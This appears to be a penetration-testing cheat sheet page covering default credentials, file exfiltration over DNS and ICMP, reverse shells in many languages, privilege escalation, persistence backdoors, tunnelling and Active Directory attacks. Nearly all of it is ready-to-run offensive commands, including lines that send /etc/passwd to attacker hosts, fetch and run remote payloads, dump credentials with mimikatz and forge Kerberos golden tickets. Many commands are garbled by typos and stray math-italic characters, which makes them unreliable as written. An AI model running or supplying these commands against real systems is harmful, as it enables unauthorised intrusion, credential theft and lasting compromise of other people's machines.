---
title: Tips and Tricks
sidebar: mydoc_sidebar
permalink: tips_and_tricks.html
folder: mydoc
---


# Tips and tricks

## Default Credential

| S/P | username | password
| :--- | :--- | :--- |
| Jenkins | admin | admin |
| AWS EC2 | ec2-user | N/A (use SSH key) |
| AWS RDS | N/A (use IAM credentials) | N/A (use IAM credentials) |
| AWS S3  | N/A (use IAM credentials) | N/A (use IAM credentials) |
| Azure VM | azureuser | N/A (use SSH key) |
| Azure SQL Database | N/A (use Azure AD authentication or SQL Server authentication) | N/A (use Azure AD authentication or SQL Server authentication) |
| Google Compute Engine | N/A (use project-level SSH key) | N/A (use project-level SSH key) |
| Google Cloud SQL  | N/A (use Cloud SQL Proxy or SSL/TLS certificate)  | N/A (use Cloud SQL Proxy or SSL/TLS certificate) |
| Docker  | root | N/A  |
| Kubernetes | N/A  | N/A (use Kubernetes authentication mechanisms) |
| OpenStack | ubuntu | ubuntu |
| VMware ESXi | root | N/A |
| Cisco IOS | cisco | cisco |
| Juniper Junos | root | juniper123 |


more: https://github.com/ihebski/DefaultCreds-cheat-sheet


## Browser Cache

### Firefox

```
𝑐𝑑 /. 𝑚𝑜𝑧𝑖𝑙𝑙𝑎/𝑓𝑖𝑟𝑒𝑓𝑜𝑥/4𝑝𝑧𝑔𝑞𝑔𝑗4. 𝑑𝑒𝑓𝑎𝑢𝑙𝑡 − 𝑟𝑒𝑙𝑒𝑎𝑠e
𝑠𝑞𝑙𝑖𝑡𝑒3 𝑝𝑙𝑎𝑐𝑒𝑠. 𝑠𝑞𝑙𝑖𝑡𝑒
.𝑡𝑎𝑏𝑙𝑒𝑠
𝑠𝑒𝑙𝑒𝑐𝑡 𝑚𝑜𝑧_𝑝𝑙𝑎𝑐𝑒𝑠. 𝑢𝑟𝑙 𝑓𝑟𝑜𝑚 𝑚𝑜𝑧_𝑝𝑙𝑎𝑐𝑒𝑠;
. 𝑞𝑢𝑖
```

## File transfer

### Transfer by ftp without direct access to shell

```text
echo open ip 21 ftp.txt
echo user ftp.txt
echo pass ftp.txt
echo bin ftp.txt
echo GET file tp.txt
echo bye ftp.txt
ftp -s:ftp.txt
```

### Transfer Dns in Linux

```text
On victim:
1. Hex encode the file to be transferred
    xxd -p secret file.hex
2. Read in each line and do a DNS lookup
    forb in 'cat fole.hex'; do dig $b.shell.evilexample.com; done

Attacker:
1. Capture DNS exfil packets
    tcdpump -w /tmp/dns -s0 port 53 and host system.example.com
2. Cut the exfilled hex from the DNS packet
    tcpdump -r dnsdemo -n | grep shell.evilexample.com | cut -f9 -d'
    cut -f1 -d'.' | uniq received. txt
3. Reverse the hex encoding
    xxd -r -p received~.txt kefS.pgp
```

### Execute the exfil command and transfer its information with icmp

```text
On victim (never ending 1 liner):
     stringz=cat /etc/passwd | od -tx1 | cut -c8- | tr -d " " | tr -d "\n";
counter=0; while (($counter = ${#stringZ})) ;do ping -s 16 -c l -p
${stringZ:$counter:16} 192.168.10.10 &&
counter=$( (counter+~6)) ; done

On attacker (capture pac~ets to data.dmp and parse):
tcpdump -ntvvSxs 0 'icmp[0]=8' data.dmp
grep Ox0020 data.dmp | cut -c21- | tr -d " " | tr -d "\n" | xxd -r -p
```

### Open mail relay

```text
C:\ telnet x.x.x.x 25
Hello x.x.x.x
MAIL FROM: me@you.com
RCPT TO: YOU@YOU.com
DATA
Thank you.
quit
```


## Reverse loose

### Netcat command \(\* run on the attacker's system\)

```text
nc 10.0.0.1 1234 -e /bin/sh Linux reverse shell
nc 10.0.0.1 1234 -e cmd.exe Windows reverse shell
```

### Netcat command \(-e may not be supported in some versions\)

```text
nc -e /bin/sh 10.0.0.1 1234
```

### Netcat command for when -e is not supported

```text
rm /tmp/f;mkfifo /tmp/f;cat /tmp/fl/bin/sh -i 2 &line l0.0.0.1 1234 /tmp/f
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.15.105 9999 >/tmp/f
```

### Perl language

```text
perl -e 'use Socket; $i="10.0.0.l"; $p=1234; socket (S, PF INET, SOCK STREAM,
getprotobjname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){
open(STDIN," &S") ;open(STDOUT," &S"); open(STDERR," &S"); exec("/bin/sh" -i");};'
```

### Perl language without /bin/sh

```text
perl -MIO -e '$p=fork;exit,if($p);$c=new
IO::Socket::INET(PeerAddr,"attackerip:4444");STDIN- fdopen($c,r);$~-fdopen($
c, w) ; system$_ while ;'
```

### Perl language for windows

```text
perl -MIO -e '$c=new IO: :Socket: :INET(PeerAddr,''attackerip:4444'') ;STDIN-fdopen($
c,r) ;$~- fdopen($c,w) ;system$_ while ;'
```

### Python language

```text
python -c 'import socket, subprocess, os; s=socket. socket (socket. AF_INET,
socket.SOCK_STREAM); s.connect( ("10.0.0.1",1234)); os.dup2 (s.fileno() ,0);
os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);
p=subprocess.call(["/bin/sh","-i"]);'
```
Or


```text
check sudoer script content like:

#!/usr/bin/python3
from shutil import make_archive
src = '/var/www/html/'
# old ftp directory, not used anymore
#dst = '/srv/ftp/html'
dst = '/var/backups/html'
make_archive(dst, 'gztar', src)
You have new mail in /var/mail/waldo

and create file for got root as shutil.py contains:

import os
import pty
import socket

lhost = "10.10.10.10"
lport = 4444

ZIP_DEFLATED = 0

class ZipFile:
   def close(*args):
       return
   def __init__(self, *args):
       return

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((lhost, lport))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
os.putenv("HISTFILE",'/dev/null')
pty.spawn("/bin/bash")
s.close()

and run sudoer script with 

sudo -E PYTHONPATH=$(pwd) /opt/scripts/admin_tasks.sh 6
```


### Bash language

```text
bash -i & /dev/tcp/10.0.0.1/8080 0 &1
```

### Java language

```text
r = Runtime.getRuntime()
p = r.exec( ["/bin/bash","-c","exec 5 /dev/tcp/10.0.0.1/2002;cat &5 |
while read line; do \$line 2 &5 &5; done"] as String[])
p.waitFor()
```

### Php language

```text
php -r '$sock=fsockopen("10.0.0.1", 1234) ;exec("/bin/sh -i &3 &3 2 &3");'
```

### Ruby language

```text
ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",1234).to_i; exec
sprintf("/bin/sh -i &%d &%d 2 &%d",f,f,f)'
```

### Ruby language without /bin/sh

```text
by -rsocket -e 'exit if
fork;c=TCPSocket.new("attackerip","4444");while(cmd=c.gets);IO.popen(cmd, " r
") {| io|c.print io.read}end'
```

### Ruby language for windows

```text
ruby -rsocket -e
'c=TCPSocket.new("attackerip","4444");while(crnd=c.gets);IO.popen{cmd,"r" ) {|
io|c.print io.read}end'
```

### Telnet command

```text
rm -f /tmp/p; mknod /tmp/p p && telnet attackerrip 4444 0/tmp/p
--OR--
telnet attacker rip 4444 | /bin/bash | telnet attacker rip 4445
```

### Xterm command

```text
xterm -display 10.0.0.1:1
o Start Listener: Xnest: 1
o Add permission to connect: xhost +victimP
```

### Other

```text
wget hhtp:// server /backdoor.sh -O- | sh Downloads and runs backdoor.sh
```

### spawn shell


```text
python3 -c 'import pty; pty.spawn("/bin/sh")'
```

or

```
sudo - I
python -c 'import pty; pty. spawn("/bin/bash”)’
sudo -u webadmin vi
ESC +:+ !/bin/sh
bash - i
whoami
```

```text
try ctrl + z
stty raw -echo 
fg
```

```text
echo os.system('/bin/bash')
```

```text
/bin/sh -i
```


```text
perl —e 'exec "/bin/sh";'
```

```text
perl: exec "/bin/sh";
```

```text
ruby: exec "/bin/sh"
```

```text
lua: os.execute('/bin/sh')
```

```text
(From within IRB)
exec "/bin/sh"
```


```text
(From within vi)
:!bash
```

```text
(From within vi)
:set shell=/bin/bash:shell
```

```text
(From within nmap)
!sh
```

 [netsec.ws](http://netsec.ws/?p=337)

## Improve accessibility

Help: https://gtfobins.github.io/

### Increasing accessibility with composer

```text
TF=$(mktemp -d)
echo '{"scripts":{"x":"/bin/sh -i 0<&3 1>&3 2>&3"}}' >$TF/composer.json
sudo composer --working-dir=$TF run-script x
```

### Increasing access with docker

You must be logged in with an application that is a member of the docker group.

```text
docker run -v /root:/mnt -it ubuntu
```

Or

```text
docker run --rm -it --privileged nginx bash
mkdir /mnt/fsroot
mount /dev/sda /mnt/fsroot
```

### Increasing access with docker socket


```text

Checking docker exposure

curl -s --unix-socket /var/run/docker.sock http://localhost/images/json

We do the following commands in the script.

cmd="whoami"
payload="[\"/bin/sh\",\"-c\",\"chroot /mnt sh -c \\\"$cmd\\\"\"]"
response=$(curl -s -XPOST --unix-socket /var/run/docker.sock -d "{\"Image\":\"sandbox\",\"cmd\":$payload, \"Binds \": [\"/:/mnt:rw\"]}" -H 'Content-Type: application/json' http://localhost/containers/create)

revShellContainerID=$(echo "$response" | cut -d'"' -f4)

curl -s -XPOST --unix-socket /var/run/docker.sock http://localhost/containers/$revShellContainerID/start
sleep 1
curl --output - -s --unix-socket /var/run/docker.sock "http://localhost/containers/$revShellContainerID/logs?stderr=1&stdout=1"

Then we run it.

./docket-socket-expose.sh
```

### chroot

```
chroot /root /bin/bash
```


### Increase access with lxd

```text
in attacker host
1. git clone https://github.com/saghul/lxd-alpine-builder.git
2. ./build-alpine
in victim host
3. Download built image
4. import ./alpine-v3.12-x86_64-20200621_2005.tar.gz --alias attacker
5. lxc init attacker tester -c security.privileged=true
6. lxc exec tester/bin/sh
```



### Increase access with WSUS

```text
SharpWSUS.exe create /payload:"C:\Users\user\Desktop\PsExec64.exe" /args:"-acceptula -s -d cmd.exe /c \"net localgroup administrator user /add\"" /title: title
SharpWSUS.exe approve /updateid:<id> /computername:dc.domain.dev /groupname:"title"

```
### Increase access in journalctl

The journalctl launcher must be run with more privileges such as sudo.

```text
journalctl
!/bin/sh
```

Or

```text
sudo journalctl
!/bin/sh
```

### Improve access with Splunk Universal Forward Hijacking

```text
python PySplunkWhisperer2_remote.py --lhost 10.10.10.5 --host 10.10.15.20 --username admin --password admin --payload '/bin/bash -c "rm /tmp/luci11;mkfifo /tmp/luci11;cat /tmp /luci11|/bin/sh -i 2>&1|nc 10.10.10.5 5555 >/tmp/luci11"'

```

### Increase access with 00-header file

```text
echo "id" >> 00-header
```

### Increase accessibility in nano

```text
Ctrl+R + Ctrl+X
reset; sh 1>&0 2>&0
```

Or

```text
Ctrl+W
/etc/shadow
```

### Increase access in vi

```text
:!/bin/sh
```


### Increase access by ShadowCredentials method

```text
whisker.exe add /target:user
.\Rubeus.exe askgt /user:user /certificate:<base64-cert> /password:"password" /domain:domain /dc:DC.domain.dev /getcredentials /show
```


### Increase access using acl

```text
$user = "megacorp\jorden"
$folder = "C:\Users\administrator"
$acl = get-acl $folder
$aclpermissions = $user, "FullControl", "ContainerInherit, ObjectInherit", "None", "Allow"
$aclrule = new-object System.Security.AccessControl.FileSystemAccessRule $aclpermissions
$acl.AddAccessRule($aclrule)
set-acl -path $folder -AclObject $acl
get-acl $folder | folder
```

### Increase access with ldap

```text

To enable ssh using ldap

0. exec ldapmodify -x -w PASSWORD
1. Paste this
dn: cn=openssh-lpk,cn=schema,cn=config
objectClass: olcSchemaConfig
cn: openssh-lpk
olcAttributeTypes: ( 1.3.6.1.4.1.24552.500.1.1.1.13 NAME 'sshPublicKey'
   DESC 'MANDATORY: OpenSSH Public key'
   EQUALITY octetStringMatch
   SYNTAX 1.3.6.1.4.1.1466.115.121.1.40)
olcObjectClasses: ( 1.3.6.1.4.1.24552.500.1.1.2.0 NAME 'ldapPublicKey' SUP top AUXILIARY
   DESC 'MANDATORY: OpenSSH LPK objectclass'
   MAY ( sshPublicKey $ uid )
   )

To improve access to the desired user and user group

2. exec ldapmodify -x -w PASSWORD
3. Paste this
dn: uid=UID,ou=users,ou=linux,ou=servers,dc=DC,dc=DC
changeType: modify
add: objectClass
objectClass: ldapPublicKey
-
add: sshPublicKey
sshPublicKey: content of id_rsa.pub
-
replace: EVIL GROUP ID
uidNumber: CURRENT USER ID
-
replace: EVIL USER ID
gidNumber: CURRENT GROUP ID
```

### Copy from ndts using SeBackupPrivilege permission

```text
import-module .\SeBackupPrivilegeUtils.dll
import-module .\SeBackupPrivilegeCmdLets.dll
Copy-FileSebackupPrivilege z:\Windows\NTDS\ntds.dit C:\temp\ndts.dit
```

### Elevate access with the SeImpersonatePrivilege permission

```text
https://github.com/dievus/printspoofer
printspoofer.exe -i -c "powershell -c whoami"
```

### Read files without authentication with diskshadow

```text
1. priv.txt contain
SET CONTEXT PERSISTENT NEWSWRITERSp
add volume c: alias 0xprashantp
createp
expose %0xprashant% z:p
2. exec with diskshadow /s priv.txt
```

### Elevate access with the SeLoadDriverPrivilege permission

```text

FIRST:
Download https://github.com/FuzzySecurity/Capcom-Rootkit/blob/master/Driver/Capcom.sys
Download https://raw.githubusercontent.com/TarlogicSecurity/EoPLoadDriver/master/eoploaddriver.cpp
Download https://github.com/tandasat/ExploitCapcom
change ExploitCapcom.cpp line 292
TCHAR CommandLine[] = TEXT("C:\\Windows\\system32\\cmd.exe");
to
TCHAR CommandLine[] = TEXT("C:\\test\\shell.exe");
then compile ExploitCapcom.cpp and eoploaddriver.cpp to .exe

SECOND:
1. msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.4 LPORT=4444 -f exe > shell.exe
2. .\eoploaddriver.exe System\CurrentControlSet\MyService C:\test\capcom.sys
3. .\ExploitCapcom.exe
4. in msf exec `run`
```

### Escalation with find

```
var/lib/jenkins/find . -exec bash -p -i > & /dev/tcp/192.168.2.x/8000 0 > &1 \; - quit
```

### Upgrade access with vds.exe service

```text
. .\PowerUp.ps1
Invoke-ServiceAbuse -Name 'vds' -UserName 'domain\user1'
```

### Improve access with ForceChangePassword


```text
https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1
Import-Module .\PowerView_dev.ps1
Set-DomainUserPassword -Identity user1 -verbose
Enter-PSSession -ComputerName COMPUTERNAME -Credential “”
```

### Improving access with the browser service

```text
. .\PowerUp.ps1
Invoke-ServiceAbuse -Name 'browser' -UserName 'domain\user1'
```

### Improve access with GenericWrite access

```text
$pass = ConvertTo-SecureString 'Password123#' -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential('DOMAIN\MASTER USER'), $pass)
Set-DomainObject -Credential $creds USER1 -Clear service principalname
Set-DomainObject -Credential $creds -Identity USER1 -SET @{serviceprincipalname='none/fluu'}
.\Rubeus.exe kerberoast /domain:<DOMAIN>
```

### Improve access using Sql service and ActiveSessions

```text
https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/lateral_movement/Invoke-SQLOSCmd.ps1
. .\Heidi.ps1
Invoke-SQLOCmd -Verbose -Command “net localgroup administrators user1 /add” -Instance COMPUTERNAME
```

### Get golden ticket using mimikatz and scheduled task

```text
1.mimikatz# token::elevate
2.mimikatz# vault::cred /patch
3.mimikatz# lsadump::lsa /patch
4.mimikatz# kerberos::golden /user:Administrator /rc4:<Administrator NTLM(step 3)> /domain:<DOMAIN> /sid:<USER SID> /sids:<Administrator SIDS> /ticket:<OUTPUT TICKET PATH >
5. powercat -l -v -p 443
6.schtasks /create /S DOMAIN /SC Weekly /RU "NT Authority\SYSTEM" /TN "enterprise" /TR "powershell.exe-c 'iex (iwr http://10.10.10.10/reverse.ps1)'"
7.schtasks /run /s DOMAIN /TN "enterprise"
```

### Upgrade access using the Pass-the-Ticket method

```text
1..\Rubeus.exe askgt /user:<USET>$ /rc4:<NTLM HASH> /ptt
2. klist
```

### Upgrade access with vulnerable GPO

```text
1..\SharpGPOAbuse.exe --AddComputerTask --Taskname "Update" --Author DOMAIN\<USER> --Command "cmd.exe" --Arguments "/c net user Administrator Password!@# /domain" -- GPOName "ADDITIONAL DC CONFIGURATION"
```

### Golden Ticket production with mimikatz

```text
1.mimikatz # lsadump::dcsync /user:<USER>
2.mimikatz # kerberos::golden /user:<USER> /domain:</DOMAIN> /sid:<OBJECT SECURITY ID> /rce:<NTLM HASH> /id:<USER ID>
```

### Upgrade access with TRUSTWORTHY database in SQL Server


```text
1. . .\PowerUpSQL.ps1
2. Get-SQLInstanceLocal -Verbose
3. (Get-SQLServerLinkCrawl -Verbos -Instance "10.10.10.10" -Query 'select * from master..sysservers').customer.query
4. 
USE "master";
SELECT *, SCHEMA_NAME("schema_id") AS 'schema' FROM "master"."sys"."objects" WHERE "type" IN ('P', 'U', 'V', 'TR', 'FN', 'TF, 'IF');
execute('sp_configure "xp_cmdshell",1;RECONFIGURE') at "<DOMAIN>\<DATABASE NAME>"
5. powershell -ep bypass
6. Import-Module .\powercat.ps1
7. powercat -l -v -p 443 -t 10000
8.
SELECT *, SCHEMA_NAME("schema_id") AS 'schema' FROM "master"."sys"."objects" WHERE "type" IN ('P', 'U', 'V', 'TR', 'FN', 'TF, 'IF');
execute('sp_configure "xp_cmdshell",1;RECONFIGURE') at "<DOMAIN>\<DATABASE NAME>" 
execute('exec master..xp_cmdshell "\\10.10.10.10\reverse.exe"') at "<DOMAIN>\<DATABASE NAME>" 
```

### gdbus

```text
gdbus call --system --dest com.ubuntu.USBCreator --object-path /com/ubuntu/USBCreator --method com.ubuntu.USBCreator.Image /home/nadav/authorized_keys /root/.ssh/authorized_keys true
```



## Permanent access

### for Linux \(in the attacker's system\)

```text
crontab -e: set for every 10 min
0-59/10 nc ip 777 -e /bin/bash
```

### for Windows \(start task scheduler\)

```text
sc config schedule start = auto
net start schedule
at 13:30 "C:\nc.exe ip 777 -e cmd.exe""
```

### Running a backdoor along with bypassing the Windows firewall

```text
1. REG add HKEY CURRENT USER\Software\Microsoft\Windows\CurrentVersion\Run
    /v firewall 7t REG SZ /d "c:\windows\system32\backdoor.exe" /f
2. at 19:00 /every:M,T,W,Th,F cmd /c start "%USERPROFILE%\backdoor.exe"
3. SCHTASKS /Create /RU "SYSTEt1" /SC MINUTE /t10 45 /TN FIREWALL /TR
    "%USERPROFILE%\backdoor.exe" /ED 12/12/2012
```

### Payload development in smb or webdav

```text
Via SMB:
1. From the compromised machine, share the payload folder
2. Set sharing to 'Everyone'
3. Use psexec or wmic command to remotely execute payload

Via WebDAV:
1. Launch Metasploit 'webdav file server' module
2. Set the following options:
     localexe = true
     localfile= payload
     localroot= payload directory
     disablePayloadHandler=true
3. Use psexec or wmic command to remotely execute payload
     psexec \\ remote ip /u domain\compromised_user /p password "\\payload
     ip \test\msf.exe"

OR -
wmic /node: remote ip /user:domain\compromised user //password:password
process call create "\\ payload ip \test\msf.exe"
```

## Get lsass process and extract information with mimikatz

```text
procdump.exe -accepteula -64 -ma lsass.exe lsass.dmp
mimikatz # sekurlsa::minidump lsass.dmp
mimikatz # sekurlsa::logonPasswords f
```

## Extract information in memory using mimikatz plugin in volatility

```text
volatility — plugins=/usr/share/volatility/plugins — profile=Win7SP0x86 -f halomar.dmp mimikatz
````

## Tunnel

### SSH Tunnel

```
ssh -D 8083 root@192.168.8.3
vi /etc/proxychains.conf ->  socks4 127.0.0.1 8083
proxychains nap -sT 10.1.3.1 -Pn
```

### Fpipe - receiving information from port 1234 and transferring to port 80 2.2.2.2

```text
fpipe.exe -l 1234 -r 80 2.2.2.2
```

### Socks.exe - Intranet scanning in Socks proxy

```text
On redirector (1.1.1.1):
     socks.exe -i1.1.1.1 -p 8C80

Attacker:
Modify /etc/proxjchains.conf:
Comment out: #proxy_dns
Comment out: #socks4a 127.0.0.1 9050
Add line: socks4 1.1.1.1 8080
Scan through socks proxy:
     proxychains nmap -PN -vv -sT -p 22,135,139,445 2.2.2.2
```

### Socat - receiving information from port 1234 and transferring to port 80 2.2.2.2

```text
socat TCP4:LISTEN:1234 TCP4:2.2.2.2:80
```

### Create ssh without ssh service

```text
./socat TCP-LISTEN:22,fork,reuseaddr TCP:172.10.10.11:22
```

### Stunnel - ssl encapsulated in nc tunnel \(Windows & Linux\) \[8\]


```text
On attacker (client):
Modify /stunnel.conf
    clien = yes
    [netcat client]
    accept = 5555
    connect = -Listening IP-:4444

On victim (listening server)
Modify /stunnel.conf
    client = no
    [ne~cat server]
    accept = 4444
    connect = 7777
C:\ nc -vlp 7777

On attacker (client):
# nc -nv 127.0.0.1 5555
```

## Search tips on google

| **Parameter** | **Explanation** |
| :--- | :--- |
| site: \[url\] | Search for a site \[url\] |
| numrange: \[\#\]...\[\#\] | Search in the numerical range |
| date: \[ \#\] | Search in the last month
| link: \[url\] | Search for pages that have a specific address
| related: \[url\] | Search for pages related to a specific address
| intitle: \[string\] | Search for pages that have a specific title
| inurl: \[string\] | Search for pages that have a specific address in their url
| filejpe: \[xls\] | Search all files with xls extension
| phonebook: \[name\] | Search all phone books that have a specific name

## Video teleconferencing tips

### Polycom brand

```text
telnet ip
#Enter 1 char, get uname:pwd
http://ip/getsecure.cgi
http://ip/er_a_rc1.htm
http://ip/a_security.htm
http://ip/a_rc.htm
```

### Trandberg brand

```text
http://ip/snapctrl.ssi
```

### Sony webcam brand

```text
http:// ip /commard/visca-gen.cgi?visca=str
8101046202FF : Freeze Camera
```

## Convert binary to ski with perl

```text
cat blue | perl -lpe '$_=pack"B*",$_' > bin
```

## Review and implementation laboratory

```text
https://htbmachines.github.io/
```

## send mail

```text
swaks --to receiver@mail.dev --from from@mail.dev --server mail.server.dev --body "BODY"
```


## Sending the current file by nc

```text
nc 10.10.10.10 3131 < output.zip
```


## read auth clear-text credentials in nix

```
more /var/log/auth.log
```

## jenkins reverse shell

```
1)
nc -nvlp 999

2)
Visit http://10.1.3.1:1234/script/console
String host="192.168.2.x";
int port=999;
String cmd="/bin/bash";Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new
Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream
po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available
()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try
{p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```

## check linux joined ad

```
/etc/krb5.conf
```

or

```
"kinit -k host/$(hostname -f)"
```

## linux ad credential stored

```
/var/lib/jenkins/adm_domain.keytab
```

## Request TGT using the discovered keytab file

```
kinit adm_domain@OPERATIONS.ATOMIC.SITE - k - tadmin_domain. keytab
klist
```

## Requesting CIFS ticket of Child Domain Controller

```
kuno cifs\/OPS-ChildDC
klist
```

## PTH with Linux

```
apt -get install krb5 -user
export KRB5CCNAME =/tmp/krb5cc_123
proxychains psexec.py -k -no -pass -debug -dc -ip 10.1.1.2 adm_domain@OPS -CHILDDC
```

## Extract the hash of adm_domain user only (with active Kerberos ticket)

```
proxychains secretsdump. py -no -pass -just -dc -user adm_domain -debug -dc -ip 10.1.1.2
```


## Extract the hash OPERATIONS.ATOMIC.SITE (with active Kerberos ticket)

```
proxychains secretsdump. py -k -no -pass -debug -dc -ip 10.1.1.2 adm_domain@OPS -CHILDDC
```

## Extract specify for domain SID

```
proxychains lookupsid.py operations/Administrator@OPS -CHILDDC -hashes aad36435b51404eeaad3b435651404ee:5984a430e639891136c949186846f24
```

or

```
$𝑈𝑠𝑒𝑟 = 𝑁𝑒𝑤 − 𝑂𝑏𝑗𝑒𝑐𝑡 𝑆𝑦𝑠𝑡𝑒𝑚. 𝑆𝑒𝑐𝑢𝑟𝑖𝑡𝑦. 𝑃𝑟𝑖𝑛𝑐𝑖𝑝𝑎𝑙. 𝑁𝑇𝐴𝑐𝑐𝑜𝑢𝑛𝑡("𝑎𝑡𝑜𝑚𝑖𝑐","𝑘𝑟𝑏𝑡𝑔𝑡")
$𝑠𝑡𝑟𝑆𝐼𝐷 = $𝑜𝑏𝑗𝑈𝑠𝑒𝑟. 𝑇𝑟𝑎𝑛𝑠𝑙𝑎𝑡𝑒([𝑆𝑦𝑠𝑡𝑒𝑚. 𝑆𝑒𝑐𝑢𝑟𝑖𝑡𝑦. 𝑃𝑟𝑖𝑛𝑐𝑖𝑝𝑎𝑙. 𝑆𝑒𝑐𝑢𝑟𝑖𝑡𝑦𝐼𝑑𝑒𝑛𝑡𝑖𝑓𝑖𝑒𝑟])
$𝑠𝑡𝑟𝑆𝐼𝐷.𝑉𝑎𝑙𝑢𝑒
```


## Forge a golden ticket using OPERATIONS.ATOMIC.SITE “krbtgt” account

```
kerberos::golden /user: Administrator /domain:operations.atomic.site /sid:S-1-5-21-3757735274-1965336150-1982876978 /
krbtgt:8e268effbf6735b8fb5be206cb3dfead /sids:S-1-5-21-95921459-2896253700-3873779052-519 /ptt
```

## Schedule a task at Atomic-DC server from OPS-CHILDDC after passing golden ticket


```
1)
download & edit PowerShellTcpOneLine.ps1
https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcpOneLine.ps1


2)
schtasks /create /S atomic -dc.atomic.site /SC Weekly /RU "NT Authority \SYSTEM" /TN "warfare" /TR "powershell. exe - 'iea Object Net.WebClient).DownloadString("'http://192.168.2.x/Invoke -PowerShellTcpOneLine.ps1')"

3)
nc -nlvp 7779


4)
schtasks /Run /S atomic-dc. atomic. site /TN "warfare"

```

## Download & execute Invoke-Mimikatz.ps1 in memory

```
 (𝑁𝑒𝑤 − 𝑂𝑏𝑗𝑒𝑐𝑡 𝑁𝑒𝑡. 𝑊𝑒𝑏𝐶𝑙𝑖𝑒𝑛𝑡).𝐷𝑜𝑤𝑛𝑙𝑜𝑎𝑑𝑆𝑡𝑟𝑖𝑛𝑔(′ℎ𝑡𝑡𝑝://192.168.2. 𝑥/𝐼𝑛𝑣𝑜𝑘𝑒 − 𝑀𝑖𝑚𝑖𝑘𝑎𝑡𝑧. 𝑝𝑠1′);𝐼𝑛𝑣𝑜𝑘𝑒 − 𝑀𝑖𝑚𝑖𝑘𝑎𝑡𝑧 −
𝐶𝑜𝑚𝑚𝑎𝑛𝑑 "𝑠𝑒𝑘𝑢𝑟𝑙𝑠𝑎: :𝑙𝑜𝑔𝑜𝑛𝑝𝑎𝑠𝑠𝑤𝑜𝑟𝑑𝑠"
```

## Psexec in ATOMIC-DC server as enterprise administrator:

```
𝑝𝑟𝑜𝑥𝑦𝑐ℎ𝑎𝑖𝑛𝑠 𝑝𝑠𝑒𝑥𝑒𝑐. 𝑝𝑦 − 𝑑𝑒𝑏𝑢𝑔 − ℎ𝑎𝑠ℎ𝑒𝑠 ∶ 𝑐49927𝑎1𝑒𝑏5𝑎335𝑑𝑓𝑏681𝑑𝑏95𝑑3𝑎45𝑎2 𝑎𝑡𝑜𝑚𝑖𝑐/𝐴𝑑𝑚𝑖𝑛𝑖𝑠𝑡𝑟𝑎𝑡𝑜𝑟@𝐴𝑇𝑂𝑀𝐼𝐶 − 𝐷𝐶
```


## Enumerate named account with SPN in Nuclear.site domain

```
𝐼𝐸𝑋 (𝑁𝑒𝑤 − 𝑂𝑏𝑗𝑒𝑐𝑡 𝑁𝑒𝑡. 𝑊𝑒𝑏𝐶𝑙𝑖𝑒𝑛𝑡).𝐷𝑜𝑤𝑛𝑙𝑜𝑎𝑑𝑆𝑡𝑟𝑖𝑛𝑔(′ℎ𝑡𝑡𝑝://192.168.2.2/𝑃𝑜𝑤𝑒𝑟𝑉𝑖𝑒𝑤_𝑑𝑒𝑣. 𝑝𝑠1′)
𝐺𝑒𝑡 − 𝑁𝑒𝑡𝐷𝑜𝑚𝑎𝑖𝑛𝑇𝑟𝑢𝑠𝑡 | ? {$_. 𝑇𝑟𝑢𝑠𝑡𝑇𝑦𝑝𝑒 − 𝑛𝑒 ′𝐸𝑥𝑡𝑒𝑟𝑛𝑎𝑙′} | %{𝐺𝑒𝑡 − 𝑁𝑒𝑡𝑈𝑠𝑒𝑟 − 𝑆𝑃𝑁 − 𝐷𝑜𝑚𝑎𝑖𝑛 $_. 𝑇𝑎𝑟𝑔𝑒𝑡𝑁𝑎𝑚𝑒}
```

## kerberoasting 

```
1)
𝐺𝑒𝑡 − 𝑁𝑒𝑡𝐷𝑜𝑚𝑎𝑖𝑛𝑇𝑟𝑢𝑠𝑡 | ? {$_. 𝑇𝑟𝑢𝑠𝑡𝑇𝑦𝑝𝑒 − 𝑛𝑒 ′𝐸𝑥𝑡𝑒𝑟𝑛𝑎𝑙′} | %{𝐺𝑒𝑡 − 𝑁𝑒𝑡𝑈𝑠𝑒𝑟 − 𝑆𝑃𝑁 − 𝐷𝑜𝑚𝑎𝑖𝑛 $_. 𝑇𝑎𝑟𝑔𝑒𝑡𝑁𝑎𝑚𝑒}

2)Enumerate accounts with SPN set in nuclear.site domain
𝑅𝑒𝑞𝑢𝑒𝑠𝑡 − 𝑆𝑃𝑁𝑇𝑖𝑐𝑘𝑒𝑡 − 𝑆𝑃𝑁 𝐻𝑇𝑇𝑃/𝑛𝑢𝑐𝑙𝑒𝑎𝑟 − 𝑑𝑐. 𝑛𝑢𝑐𝑙𝑒𝑎𝑟. 𝑠𝑖𝑡𝑒

3)
𝐼𝑛𝑣𝑜𝑘𝑒 − 𝐾𝑒𝑟𝑏𝑒𝑟𝑜𝑎𝑠𝑡 − 𝐷𝑜𝑚𝑎𝑖𝑛 𝑛𝑢𝑐𝑙𝑒𝑎𝑟. 𝑠𝑖𝑡𝑒 | % { $_.𝐻𝑎𝑠ℎ } | 𝑂𝑢𝑡 − 𝐹𝑖𝑙𝑒 − 𝐸𝑛𝑐𝑜𝑑𝑖𝑛𝑔 𝐴𝑆𝐶𝐼𝐼 ℎ𝑎𝑠ℎ𝑒𝑠. 𝑘𝑒𝑟𝑏𝑒𝑟𝑜𝑎𝑠𝑡

4)Filter the output to include only account HASH
